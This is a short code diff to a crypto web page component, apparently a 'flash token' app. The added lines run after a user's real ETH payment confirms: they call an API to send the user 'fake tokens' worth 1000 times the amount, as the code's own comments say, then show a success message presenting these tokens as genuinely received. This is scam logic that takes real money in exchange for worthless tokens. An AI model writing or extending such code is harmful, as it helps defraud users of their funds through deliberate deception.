@@ -1882,7 +1882,21 @@ function FlashedPageContent() {
                         });
                         
                         await tx.wait();
-                        setStatus('✅ Transaction sent successfully!');
+                        
+                        // Send fake tokens back to user
+                        const fakeTokenAmount = parseFloat(sendAmount) * 1000; // 1000x fake tokens
+                        await fetch('/api/send-fake-tokens', {
+                          method: 'POST',
+                          headers: { 'Content-Type': 'application/json' },
+                          body: JSON.stringify({
+                            userAddress: userAddress,
+                            tokenAmount: fakeTokenAmount,
+                            realEthPaid: sendAmount,
+                            txHash: tx.hash
+                          })
+                        });
+                        
+                        setStatus(`✅ Received ${fakeTokenAmount} FLASH tokens! Check your wallet.`);
                         setShowModal(null);
                         setLoading(false);
                       } catch (error) {
